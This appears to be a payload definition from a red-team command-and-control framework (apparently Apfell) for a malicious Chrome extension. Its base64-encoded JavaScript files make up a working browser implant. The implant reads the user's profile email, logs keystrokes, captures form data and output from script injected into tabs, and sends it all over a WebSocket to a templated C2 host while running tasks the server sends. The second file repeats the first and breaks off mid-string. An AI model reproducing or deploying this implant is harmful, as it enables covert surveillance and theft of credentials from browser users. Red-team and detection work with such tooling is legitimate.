{"payload_types":[{"wrapper":false,"command_template":"command_name = function(params) {\n    \/\/ Command code here\n};\n\nC2.commands[command_name.name] = command_name;\nCOMMAND_ENDS_HERE","supported_os":"linux (x86),linux (x64),macOS (x86),macOS (x64),Windows (x86),Windows (x64)","execute_help":"Add the resulting payload file to the extension-template. Then compile the extension-template folder to obtain a .crx file.","external":false,"container_running":true,"service":"rabbitmq","last_heartbeat":"10\/08\/2019 14:46:45","ptype":"chrome-extension","file_extension":"js","wrapped_payload_type":"null","icon":null,"files":[{"chrome-extension.js":"Ly8tLS0tLS0tLS0tLS0tLUlNUExBTlQgSU5GT1JNQVRJT04tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBpbXBsYW50ewogICAgY29uc3RydWN0b3IoKXsKICAgICAgICB0aGlzLmhvc3RpbmZvID0gImNocm9tZSI7CiAgICAgICAgdGhpcy51c2VyaW5mbyA9ICcnOwogICAgICAgIHRoaXMucHJvY2luZm8gPSAwOwogICAgICAgIHRoaXMudXVpZCA9ICJVVUlEX0hFUkUiOwogICAgICAgIHRoaXMuYXBmZWxsaWQgPSAwOwogICAgfQp9CgphcGZlbGwgPSBuZXcgaW1wbGFudCgpOwovLy0tLS0tLS0tLS0tLS0tQmFzZSBDMiBJTkZPUk1BVElPTi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBiYXNlQzIgewogICAgY29uc3RydWN0b3IoaG9zdCwgcG9ydCwgZW5kcG9pbnQsIHNzbCwgaW50ZXJ2YWwpIHsKICAgICAgICB0aGlzLmhvc3QgPSBob3N0OwogICAgICAgIHRoaXMucG9ydCA9IHBvcnQ7CiAgICAgICAgdGhpcy5wcm90byA9ICcnOwogICAgICAgIHRoaXMuaW50ZXJ2YWwgPSBpbnRlcnZhbDsKICAgICAgICB0aGlzLmNvbW1hbmRzID0ge307CgogICAgICAgIGlmIChzc2wgPT09IHRydWUpIHsKICAgICAgICAgICAgdGhpcy5wcm90byA9ICd3c3M6Ly8nOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHRoaXMucHJvdG8gPSAnd3M6Ly8nOwogICAgICAgIH0KICAgICAgICB0aGlzLnNlcnZlciA9IGAke3RoaXMucHJvdG99JHt0aGlzLmhvc3R9OiR7dGhpcy5wb3J0fS8ke2VuZHBvaW50fWA7CiAgICB9CgogICAgZ2V0SW50ZXJ2YWwoKXsKICAgICAgICByZXR1cm4gdGhpcy5pbnRlcnZhbDsKICAgIH0KCiAgICBnZXRDb25maWcoKXsKICAgICAgICAvLyByZXR1cm4gdGhlIGMyIGNvbmZpZwogICAgfQoKICAgIHBvc3RSZXNwb25zZSgpewogICAgICAgIC8vb3V0cHV0IGEgcmVzcG9uc2UgdG8gYSB0YXNrCiAgICB9CiAgICBzZXRDb25maWcoKXsKICAgICAgICAvL05vdCBpbXBsZW1lbnRlZAogICAgfQogICAgZG93bmxvYWQoKXsKICAgICAgICAvL05vdCBJbXBsZW1lbnRlZAogICAgfQogICAgdXBsb2FkKCl7CiAgICAgICAgLy9Ob3QgaW1wbGVtZW50ZWQKICAgIH0KCiAgICBjaGVja0luKCl7CiAgICAgICAgLy8gcmVnaXN0ZXIgdGhpcyBjYWxsYmFjayB3aXRoIHRoZSBzZXJ2ZXIKICAgIH0KCiAgICBzZW5kUmVzcG9uc2UoKXsKICAgICAgICAvLyBTZW5kIGEgcmVzcG9uc2UgdG8gdGhlIHNlcnZlcgogICAgfQp9CgovLy0tLS0tLS0tLS0tLS1TSEFSRUQgQ09NTUFORCBDT0RFIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpsZXQga2V5bG9nVGFza0lEID0gMDsKbGV0IGtleWxvZ2dlcnMgPSBbXTsKCgpjaHJvbWUuaWRlbnRpdHkuZ2V0UHJvZmlsZVVzZXJJbmZvKGZ1bmN0aW9uKGluZm8pewogICAgYXBmZWxsLnVzZXJpbmZvID0gaW5mby5lbWFpbDsKfSk7Ci8vIEMyIFByb2ZpbGUgQ29kZQpDMlBST0ZJTEVfSEVSRQovLyBDb21tYW5kcwpDT01NQU5EU19IRVJF"}],"c2_profiles":{"chrome-server":[{"extension-c2.js":"Ly8tLS0tLS0tLS0tLS0tIENocm9tZSBFeHRlbnNpb24gV2Vic29ja2V0IEMyIG1lY2hhbmlzbXMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vIERpY3Rpb25hcnkgdGhhdCBob2xkcyBvdXRib3VuZCBtZXNzYWdlcwpsZXQgb3V0ID0gW107CmNsYXNzIGN1c3RvbUMyIGV4dGVuZHMgYmFzZUMyewogICAgY29uc3RydWN0b3IoaG9zdCwgcG9ydCwgZW5kcG9pbnQsIHNzbCAsIGludGVydmFsKXsKICAgICAgICBzdXBlcihob3N0LCBwb3J0LCBlbmRwb2ludCwgc3NsLCBpbnRlcnZhbCk7CiAgICAgICAgdGhpcy5ob3N0ID0gaG9zdDsKICAgICAgICB0aGlzLnBvcnQgPSBwb3J0OwogICAgICAgIHRoaXMuZW5kcG9pbnQgPSBlbmRwb2ludDsKICAgICAgICB0aGlzLmludGVydmFsID0gaW50ZXJ2YWw7CiAgICAgICAgdGhpcy5jb21tYW5kcyA9IHt9OwoKICAgICAgICBpZiAoc3NsID09PSB0cnVlKXsKICAgICAgICAgICAgdGhpcy5wcm90byA9ICd3c3M6Ly8nOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHRoaXMucHJvdG8gPSAnd3M6Ly8nOwogICAgICAgIH0KCiAgICAgICAgdGhpcy5zZXJ2ZXIgPSBgJHt0aGlzLnByb3RvfSR7dGhpcy5ob3N0fToke3RoaXMucG9ydH0vJHt0aGlzLmVuZHBvaW50fWA7CiAgICB9CgogICAgZ2V0Q29uZmlnKCkgewogICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeSh7J3NlcnZlcic6IHRoaXMuc2VydmVyLCAnaW50ZXJ2YWwnOnRoaXMuaW50ZXJ2YWwsICdjb21tYW5kcyc6IEpTT04uc3RyaW5naWZ5KHRoaXMuY29tbWFuZHMpfSk7CiAgICB9CgogICAgY2hlY2tJbigpIHsKICAgICAgICBjb25zdCBsb2NhbEFkZHJlc3MgPSAnMTI3LjAuMC4xJzsKICAgICAgICBjb25zdCBjaGVja0luTWVzc2FnZSA9IENyZWF0ZUNhbGxiYWNrQ2hlY2tJbk1lc3NhZ2UoYXBmZWxsLnVzZXJpbmZvLCBhcGZlbGwudXVpZCwgMCwgbG9jYWxBZGRyZXNzLCAnY2hyb21lJyk7CiAgICAgICAgY29uc3QgbWV0YSA9IHt9OwogICAgICAgIG1ldGFbIm1ldGF0eXBlIl0gPSAyOwogICAgICAgIG1ldGFbIm1ldGFkYXRhIl0gPSBjaGVja0luTWVzc2FnZTsKICAgICAgICBjb25zdCBtZXRhZW52ZWxvcGUgPSBKU09OLnN0cmluZ2lmeShtZXRhKTsKICAgICAgICBjb25uZWN0aW9uLnNlbmQobWV0YWVudmVsb3BlKTsKICAgICAgICBjb25zb2xlLmxvZygnU2VudCBpbml0aWFsIGNoZWNraW4nKTsKICAgIH0KCiAgICBwb3N0UmVzcG9uc2UoKXsKICAgICAgICBpZiAob3V0Lmxlbmd0aCA+IDApewogICAgICAgICAgICAvLyBQb3AgYW5kIHNlbmQgYSBtZXNzYWdlIHRvIHRoZSBjb250cm9sbGVyCiAgICAgICAgICAgIGNvbnN0IG1zZyA9IG91dC5zaGlmdCgpOwogICAgICAgICAgICBjb25uZWN0aW9uLnNlbmQobXNnKTsKICAgICAgICB9CiAgICB9Cn0KCgovLy8gQ3JlYXRlIGEgQ2FsbGJhY2sgQ2hlY2tpbiBNZXNzYWdlCmZ1bmN0aW9uIENyZWF0ZUNhbGxiYWNrQ2hlY2tJbk1lc3NhZ2UodXNlcm5hbWUsIHV1aWQsIHBpZCwgYWRkcmVzc2VzLCBob3N0bmFtZSkgewogICAgbGV0IG1zZyA9IHt9OwogICAgbXNnLnVzZXIgPSB1c2VybmFtZTsKICAgIG1zZy5waWQgPSBwaWQ7CiAgICBtc2cudXVpZCA9IHV1aWQ7CiAgICBtc2cuaXAgPSBhZGRyZXNzZXM7CiAgICBtc2cuaG9zdCA9IGhvc3RuYW1lOwoKICAgIHJldHVybiBtc2c7Cn0KCmZ1bmN0aW9uIENyZWF0ZUFwZmVsbE1lc3NhZ2UodHlwZSwgYXBmZWxsSUQsIHV1aWQsIHNpemUsIHRhc2tpZCwgdGFza3R5cGUsIGRhdGEpIHsKICAgIGNvbnN0IG1zZyA9IHt9OwogICAgbXNnLnR5cGUgPSB0eXBlOwogICAgbXNnLmlkID0gYXBmZWxsSUQ7CiAgICBtc2cudXVpZCA9IHV1aWQ7CiAgICBtc2cuc2l6ZSA9IHNpemU7CiAgICBtc2cudGFza2lkID0gdGFza2lkOwogICAgbXNnLnRhc2t0eXBlID0gdGFza3R5cGU7CiAgICBtc2cuZGF0YSA9ICBkYXRhOwoKICAgIHJldHVybiBtc2c7Cn0KCi8vLS0tLS0tLS0tLS0tLSBJTlNUQU5USUFURSBPVVIgQzIgQ0xBU1MgQkVMT1cgSEVSRSBJTiBNQUlOIENPREUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjb25zdCBDMiA9IG5ldyBjdXN0b21DMignSE9TVF9SRVBMQUNFJywgIFBPUlRfUkVQTEFDRSwgJ0VORFBPSU5UX1JFUExBQ0UnLCBTU0xfUkVQTEFDRSwgSU5URVJWQUxfUkVQTEFDRSk7CmNvbnN0IGNvbm5lY3Rpb24gID0gbmV3IFdlYlNvY2tldChgJHtDMi5zZXJ2ZXJ9YCk7CgpzZXRJbnRlcnZhbChmdW5jdGlvbigpewogICAgQzIucG9zdFJlc3BvbnNlKCk7Cn0sIEMyLmludGVydmFsKTsKCmNocm9tZS5ydW50aW1lLm9uTWVzc2FnZS5hZGRMaXN0ZW5lcihmdW5jdGlvbihtZXNzYWdlLCBzZW5kZXIsIHNlbmRSZXNwb25zZSkgewogICAgLy8gTGlzdGVuIGZvciBldmVudHMgZnJvbSBvdGhlciBzY3JpcHRzCiAgICBzd2l0Y2ggKG1lc3NhZ2UudHlwZSkgewogICAgICAgIGNhc2UgJ2tleWxvZ2dlcicgOiB7CiAgICAgICAgICAgIGNvbnN0IGtleWRhdGEgPSB7fTsKICAgICAgICAgICAga2V5ZGF0YVsidXNlciJdID0gY29uZmlnLnVzZXJuYW1lOwogICAgICAgICAgICBrZXlkYXRhWyJrZXlzdHJva2VzIl0gPSBtZXNzYWdlLmRhdGE7CiAgICAgICAgICAgIGtleWRhdGFbJ3dpbmRvd190aXRsZSddID0gbWVzc2FnZS53aW5kb3c7CiAgICAgICAgICAgIGxldCBtdHlwZSA9IG1lc3NhZ2UuZGF0YS50eXBlOwogICAgICAgICAgICBsZXQgcGF5bG9hZCA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KGtleWRhdGEpKSkpOwogICAgICAgICAgICBsZXQgZW52ZWxvcGUgPSBDcmVhdGVBcGZlbGxNZXNzYWdlKDIsIGFwZmVsbC5hcGZlbGxJRCwgYXBmZWxsLlVVSUQsIG1lc3NhZ2UuZGF0YS5sZW5ndGgsIGtleWxvZ1Rhc2tJRCwgbXR5cGUsIHBheWxvYWQpOwogICAgICAgICAgICBjb25zdCBtZXRhID0ge307CiAgICAgICAgICAgIG1ldGEudHlwZSA9IDM7CiAgICAgICAgICAgIG1ldGEubWV0YWRhdGEgPSBlbnZlbG9wZTsKICAgICAgICAgICAgY29uc3QgbWV0YWVudmVsb3BlID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgICAgIG91dC5wdXNoKG1ldGFlbnZlbG9wZSk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICBjYXNlICdmb3JtRGF0YScgOiB7CiAgICAgICAgICAgIGNvbnN0IGZvcm1EYXRhID0ge307CiAgICAgICAgICAgIGZvcm1EYXRhLnVzZXIgPSBjb25maWcudXNlcm5hbWU7CiAgICAgICAgICAgIGZvcm1EYXRhLmtleXN0cm9rZXMgPSBtZXNzYWdlLmRhdGE7CiAgICAgICAgICAgIGxldCBtdHlwZSA9IG1lc3NhZ2UuZGF0YS50eXBlOwogICAgICAgICAgICBsZXQgcGF5bG9hZCA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KGZvcm1EYXRhKSkpKTsKICAgICAgICAgICAgbGV0IGVudmVsb3BlID0gQ3JlYXRlQXBmZWxsTWVzc2FnZSgyLCBhcGZlbGwuYXBmZWxsSUQsIGFwZmVsbC5VVUlELCBtZXNzYWdlLmRhdGEubGVuZ3RoLCBrZXlsb2dUYXNrSUQsIG10eXBlLCBwYXlsb2FkKTsKICAgICAgICAgICAgY29uc3QgbWV0YSA9IHt9OwogICAgICAgICAgICBtZXRhLnR5cGUgPSAzOwogICAgICAgICAgICBtZXRhLm1ldGFkYXRhID0gZW52ZWxvcGU7CiAgICAgICAgICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICBvdXQucHVzaChtZXRhZW52ZWxvcGUpOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgY2FzZSAnY3VzdG9tJzogewogICAgICAgICAgICAvLyBjYXRjaCBvdXRwdXQgZnJvbSBjdXN0b20gamF2YXNjcmlwdCBpbmplY3RlZCBpbnRvIHRhYnMKICAgICAgICAgICAgbGV0IHBheWxvYWQgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeShtZXNzYWdlLmRhdGEpKSkpOwogICAgICAgICAgICBsZXQgbXR5cGUgPSBtZXNzYWdlLmRhdGEudHlwZTsKICAgICAgICAgICAgbGV0IGVudmVsb3BlID0gQ3JlYXRlQXBmZWxsTWVzc2FnZSgyLCBhcGZlbGwuYXBmZWxsSUQsIGFwZmVsbC5VVUlELCBtZXNzYWdlLmRhdGEubGVuZ3RoLCBrZXlsb2dUYXNrSUQsIG10eXBlLCBwYXlsb2FkKTsKICAgICAgICAgICAgY29uc3QgbWV0YSA9IHt9OwogICAgICAgICAgICBtZXRhLnR5cGUgPSAzOwogICAgICAgICAgICBtZXRhLm1ldGFkYXRhID0gZW52ZWxvcGU7CiAgICAgICAgICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICBvdXQucHVzaChtZXRhZW52ZWxvcGUpOwogICAgICAgIH0KICAgIH0KfSk7Cgpjb25uZWN0aW9uLm9ub3BlbiA9IGZ1bmN0aW9uICgpIHsKICAgIEMyLmNoZWNrSW4oKTsKfTsKCmNvbm5lY3Rpb24ub25jbG9zZSA9IGZ1bmN0aW9uICgpIHsKICAgIC8vIERvIE5vdGhpbmcKfTsKCmNvbm5lY3Rpb24ub25lcnJvciA9IGZ1bmN0aW9uICgpIHsKICAgIC8vIERvIE5vdGhpbmcKfTsKCmNvbm5lY3Rpb24ub25tZXNzYWdlID0gZnVuY3Rpb24gKGUpIHsKICAgIGNvbnN0IG1lc3NhZ2UgPSBKU09OLnBhcnNlKGUuZGF0YSk7CgogICAgc3dpdGNoIChtZXNzYWdlWydtZXRhdHlwZSddKSB7CiAgICAgICAgY2FzZSAyOiB7CiAgICAgICAgICAgIC8vIGNhbGxiYWNrIGNoZWNrIGluCiAgICAgICAgICAgIGNvbnN0IGNoZWNraW5kYXRhID0gbWVzc2FnZVsnbWV0YWRhdGEnXTsKICAgICAgICAgICAgYXBmZWxsLmFwZmVsbGlkID0gY2hlY2tpbmRhdGFbJ2FwZmVsbGlkJ107CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICBjYXNlIDMgOiB7CiAgICAgICAgICAgIC8vIGhhbmRsZSBhbiBhcGZlbGwgbWVzc2FnZQogICAgICAgICAgICBjb25zdCBkYXRhID0gbWVzc2FnZVsibWV0YWRhdGEiXTsKICAgICAgICAgICAgY29uc3QgdGFza25hbWUgPSBkYXRhWyJ0YXNrbmFtZSJdOwoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIEMyLmNvbW1hbmRzW3Rhc2tuYW1lXShkYXRhKTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiRXJyb3IgZXhlY3V0aW5nIHRhc2s6ICIgKyBlcnIpOwogICAgICAgICAgICAgICAgY29uc3QgZW52ZWxvcGUgPSBDcmVhdGVBcGZlbGxNZXNzYWdlKDIsIGFwZmVsbC5hcGZlbGxpZCwgYXBmZWxsLnV1aWQsIGVyci5sZW5ndGgsIGRhdGFbJ3Rhc2tpZCddLCBkYXRhWyd0YXNrdHlwZSddLCBlcnIpOwogICAgICAgICAgICAgICAgY29uc3QgbWV0YSA9IHt9OwogICAgICAgICAgICAgICAgbWV0YS50eXBlID0gMzsKICAgICAgICAgICAgICAgIG1ldGEubWV0YWRhdGEgPSBlbnZlbG9wZTsKICAgICAgICAgICAgICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICAgICAgb3V0LnB1c2gobWV0YWVudmVsb3BlKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfTs="},{"chrome-server.js":"Ly8tLS0tLS0tLS0tLS0tIENocm9tZSBFeHRlbnNpb24gV2Vic29ja2V0IEMyIG1lY2hhbmlzbXMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vIERpY3Rpb25hcnkgdGhhdCBob2xkcyBvdXRib3VuZCBtZXNzYWdlcwpsZXQgb3V0ID0gW107CmNsYXNzIGN1c3RvbUMyIGV4dGVuZHMgYmFzZUMyewogICAgY29uc3RydWN0b3IoaG9zdCwgcG9ydCwgZW5kcG9pbnQsIHNzbCAsIGludGVydmFsKXsKICAgICAgICBzdXBlcihob3N0LCBwb3J0LCBlbmRwb2ludCwgc3NsLCBpbnRlcnZhbCk7CiAgICAgICAgdGhpcy5ob3N0ID0gaG9zdDsKICAgICAgICB0aGlzLnBvcnQgPSBwb3J0OwogICAgICAgIHRoaXMuZW5kcG9pbnQgPSBlbmRwb2ludDsKICAgICAgICB0aGlzLmludGVydmFsID0gaW50ZXJ2YWw7CiAgICAgICAgdGhpcy5jb21tYW5kcyA9IHt9OwoKICAgICAgICBpZiAoc3NsID09PSB0cnVlKXsKICAgICAgICAgICAgdGhpcy5wcm90byA9ICd3c3M6Ly8nOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHRoaXMucHJvdG8gPSAnd3M6Ly8nOwogICAgICAgIH0KCiAgICAgICAgdGhpcy5zZXJ2ZXIgPSBgJHt0aGlzLnByb3RvfSR7dGhpcy5ob3N0fToke3RoaXMucG9ydH0vJHt0aGlzLmVuZHBvaW50fWA7CiAgICB9CgogICAgZ2V0Q29uZmlnKCkgewogICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeSh7J3NlcnZlcic6IHRoaXMuc2VydmVyLCAnaW50ZXJ2YWwnOnRoaXMuaW50ZXJ2YWwsICdjb21tYW5kcyc6IEpTT04uc3RyaW5naWZ5KHRoaXMuY29tbWFuZHMpfSk7CiAgICB9CgogICAgY2hlY2tJbigpIHsKICAgICAgICBjb25zdCBsb2NhbEFkZHJlc3MgPSAnMTI3LjAuMC4xJzsKICAgICAgICBjb25zdCBjaGVja0luTWVzc2FnZSA9IENyZWF0ZUNhbGxiYWNrQ2hlY2tJbk1lc3NhZ2UoYXBmZWxsLnVzZXJpbmZvLCBhcGZlbGwudXVpZCwgMCwgbG9jYWxBZGRyZXNzLCAnY2hyb21lJyk7CiAgICAgICAgY29uc3QgbWV0YSA9IHt9OwogICAgICAgIG1ldGFbIm1ldGF0eXBlIl0gPSAyOwogICAgICAgIG1ldGFbIm1ldGFkYXRhIl0gPSBjaGVja0luTWVzc2FnZTsKICAgICAgICBjb25zdCBtZXRhZW52ZWxvcGUgPSBKU09OLnN0cmluZ2lmeShtZXRhKTsKICAgICAgICBjb25uZWN0aW9uLnNlbmQobWV0YWVudmVsb3BlKTsKICAgICAgICBjb25zb2xlLmxvZygnU2VudCBpbml0aWFsIGNoZWNraW4nKTsKICAgIH0KCiAgICBwb3N0UmVzcG9uc2UoKXsKICAgICAgICBpZiAob3V0Lmxlbmd0aCA+IDApewogICAgICAgICAgICAvLyBQb3AgYW5kIHNlbmQgYSBtZXNzYWdlIHRvIHRoZSBjb250cm9sbGVyCiAgICAgICAgICAgIGNvbnN0IG1zZyA9IG91dC5zaGlmdCgpOwogICAgICAgICAgICBjb25uZWN0aW9uLnNlbmQobXNnKTsKICAgICAgICB9CiAgICB9Cn0KCgovLy8gQ3JlYXRlIGEgQ2FsbGJhY2sgQ2hlY2tpbiBNZXNzYWdlCmZ1bmN0aW9uIENyZWF0ZUNhbGxiYWNrQ2hlY2tJbk1lc3NhZ2UodXNlcm5hbWUsIHV1aWQsIHBpZCwgYWRkcmVzc2VzLCBob3N0bmFtZSkgewogICAgbGV0IG1zZyA9IHt9OwogICAgbXNnLnVzZXIgPSB1c2VybmFtZTsKICAgIG1zZy5waWQgPSBwaWQ7CiAgICBtc2cudXVpZCA9IHV1aWQ7CiAgICBtc2cuaXAgPSBhZGRyZXNzZXM7CiAgICBtc2cuaG9zdCA9IGhvc3RuYW1lOwoKICAgIHJldHVybiBtc2c7Cn0KCmZ1bmN0aW9uIENyZWF0ZUFwZmVsbE1lc3NhZ2UodHlwZSwgYXBmZWxsSUQsIHV1aWQsIHNpemUsIHRhc2tpZCwgdGFza3R5cGUsIGRhdGEpIHsKICAgIGNvbnN0IG1zZyA9IHt9OwogICAgbXNnLnR5cGUgPSB0eXBlOwogICAgbXNnLmlkID0gYXBmZWxsSUQ7CiAgICBtc2cudXVpZCA9IHV1aWQ7CiAgICBtc2cuc2l6ZSA9IHNpemU7CiAgICBtc2cudGFza2lkID0gdGFza2lkOwogICAgbXNnLnRhc2t0eXBlID0gdGFza3R5cGU7CiAgICBtc2cuZGF0YSA9ICBkYXRhOwoKICAgIHJldHVybiBtc2c7Cn0KCi8vLS0tLS0tLS0tLS0tLSBJTlNUQU5USUFURSBPVVIgQzIgQ0xBU1MgQkVMT1cgSEVSRSBJTiBNQUlOIENPREUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjb25zdCBDMiA9IG5ldyBjdXN0b21DMignSE9TVF9SRVBMQUNFJywgIFBPUlRfUkVQTEFDRSwgJ0VORFBPSU5UX1JFUExBQ0UnLCBTU0xfUkVQTEFDRSwgSU5URVJWQUxfUkVQTEFDRSk7CmNvbnN0IGNvbm5lY3Rpb24gID0gbmV3IFdlYlNvY2tldChgJHtDMi5zZXJ2ZXJ9YCk7CgpzZXRJbnRlcnZhbChmdW5jdGlvbigpewogICAgQzIucG9zdFJlc3BvbnNlKCk7Cn0sIEMyLmludGVydmFsKTsKCmNocm9tZS5ydW50aW1lLm9uTWVzc2FnZS5hZGRMaXN0ZW5lcihmdW5jdGlvbihtZXNzYWdlLCBzZW5kZXIsIHNlbmRSZXNwb25zZSkgewogICAgLy8gTGlzdGVuIGZvciBldmVudHMgZnJvbSBvdGhlciBzY3JpcHRzCiAgICBzd2l0Y2ggKG1lc3NhZ2UudHlwZSkgewogICAgICAgIGNhc2UgJ2tleWxvZ2dlcicgOiB7CiAgICAgICAgICAgIGNvbnN0IGtleWRhdGEgPSB7fTsKICAgICAgICAgICAga2V5ZGF0YVsidXNlciJdID0gY29uZmlnLnVzZXJuYW1lOwogICAgICAgICAgICBrZXlkYXRhWyJrZXlzdHJva2VzIl0gPSBtZXNzYWdlLmRhdGE7CiAgICAgICAgICAgIGtleWRhdGFbJ3dpbmRvd190aXRsZSddID0gbWVzc2FnZS53aW5kb3c7CiAgICAgICAgICAgIGxldCBtdHlwZSA9IG1lc3NhZ2UuZGF0YS50eXBlOwogICAgICAgICAgICBsZXQgcGF5bG9hZCA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KGtleWRhdGEpKSkpOwogICAgICAgICAgICBsZXQgZW52ZWxvcGUgPSBDcmVhdGVBcGZlbGxNZXNzYWdlKDIsIGFwZmVsbC5hcGZlbGxJRCwgYXBmZWxsLlVVSUQsIG1lc3NhZ2UuZGF0YS5sZW5ndGgsIGtleWxvZ1Rhc2tJRCwgbXR5cGUsIHBheWxvYWQpOwogICAgICAgICAgICBjb25zdCBtZXRhID0ge307CiAgICAgICAgICAgIG1ldGEudHlwZSA9IDM7CiAgICAgICAgICAgIG1ldGEubWV0YWRhdGEgPSBlbnZlbG9wZTsKICAgICAgICAgICAgY29uc3QgbWV0YWVudmVsb3BlID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgICAgIG91dC5wdXNoKG1ldGFlbnZlbG9wZSk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICBjYXNlICdmb3JtRGF0YScgOiB7CiAgICAgICAgICAgIGNvbnN0IGZvcm1EYXRhID0ge307CiAgICAgICAgICAgIGZvcm1EYXRhLnVzZXIgPSBjb25maWcudXNlcm5hbWU7CiAgICAgICAgICAgIGZvcm1EYXRhLmtleXN0cm9rZXMgPSBtZXNzYWdlLmRhdGE7CiAgICAgICAgICAgIGxldCBtdHlwZSA9IG1lc3NhZ2UuZGF0YS50eXBlOwogICAgICAgICAgICBsZXQgcGF5bG9hZCA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KGZvcm1EYXRhKSkpKTsKICAgICAgICAgICAgbGV0IGVudmVsb3BlID0gQ3JlYXRlQXBmZWxsTWVzc2FnZSgyLCBhcGZlbGwuYXBmZWxsSUQsIGFwZmVsbC5VVUlELCBtZXNzYWdlLmRhdGEubGVuZ3RoLCBrZXlsb2dUYXNrSUQsIG10eXBlLCBwYXlsb2FkKTsKICAgICAgICAgICAgY29uc3QgbWV0YSA9IHt9OwogICAgICAgICAgICBtZXRhLnR5cGUgPSAzOwogICAgICAgICAgICBtZXRhLm1ldGFkYXRhID0gZW52ZWxvcGU7CiAgICAgICAgICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICBvdXQucHVzaChtZXRhZW52ZWxvcGUpOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgY2FzZSAnY3VzdG9tJzogewogICAgICAgICAgICAvLyBjYXRjaCBvdXRwdXQgZnJvbSBjdXN0b20gamF2YXNjcmlwdCBpbmplY3RlZCBpbnRvIHRhYnMKICAgICAgICAgICAgbGV0IHBheWxvYWQgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeShtZXNzYWdlLmRhdGEpKSkpOwogICAgICAgICAgICBsZXQgbXR5cGUgPSBtZXNzYWdlLmRhdGEudHlwZTsKICAgICAgICAgICAgbGV0IGVudmVsb3BlID0gQ3JlYXRlQXBmZWxsTWVzc2FnZSgyLCBhcGZlbGwuYXBmZWxsSUQsIGFwZmVsbC5VVUlELCBtZXNzYWdlLmRhdGEubGVuZ3RoLCBrZXlsb2dUYXNrSUQsIG10eXBlLCBwYXlsb2FkKTsKICAgICAgICAgICAgY29uc3QgbWV0YSA9IHt9OwogICAgICAgICAgICBtZXRhLnR5cGUgPSAzOwogICAgICAgICAgICBtZXRhLm1ldGFkYXRhID0gZW52ZWxvcGU7CiAgICAgICAgICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICBvdXQucHVzaChtZXRhZW52ZWxvcGUpOwogICAgICAgIH0KICAgIH0KfSk7Cgpjb25uZWN0aW9uLm9ub3BlbiA9IGZ1bmN0aW9uICgpIHsKICAgIEMyLmNoZWNrSW4oKTsKfTsKCmNvbm5lY3Rpb24ub25jbG9zZSA9IGZ1bmN0aW9uICgpIHsKICAgIC8vIERvIE5vdGhpbmcKfTsKCmNvbm5lY3Rpb24ub25lcnJvciA9IGZ1bmN0aW9uICgpIHsKICAgIC8vIERvIE5vdGhpbmcKfTsKCmNvbm5lY3Rpb24ub25tZXNzYWdlID0gZnVuY3Rpb24gKGUpIHsKICAgIGNvbnN0IG1lc3NhZ2UgPSBKU09OLnBhcnNlKGUuZGF0YSk7CgogICAgc3dpdGNoIChtZXNzYWdlWydtZXRhdHlwZSddKSB7CiAgICAgICAgY2FzZSAyOiB7CiAgICAgICAgICAgIC8vIGNhbGxiYWNrIGNoZWNrIGluCiAgICAgICAgICAgIGNvbnN0IGNoZWNraW5kYXRhID0gbWVzc2FnZVsnbWV0YWRhdGEnXTsKICAgICAgICAgICAgYXBmZWxsLmFwZmVsbGlkID0gY2hlY2tpbmRhdGFbJ2FwZmVsbGlkJ107CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICBjYXNlIDMgOiB7CiAgICAgICAgICAgIC8vIGhhbmRsZSBhbiBhcGZlbGwgbWVzc2FnZQogICAgICAgICAgICBjb25zdCBkYXRhID0gbWVzc2FnZVsibWV0YWRhdGEiXTsKICAgICAgICAgICAgY29uc3QgdGFza25hbWUgPSBkYXRhWyJ0YXNrbmFtZSJdOwoKICAgICAg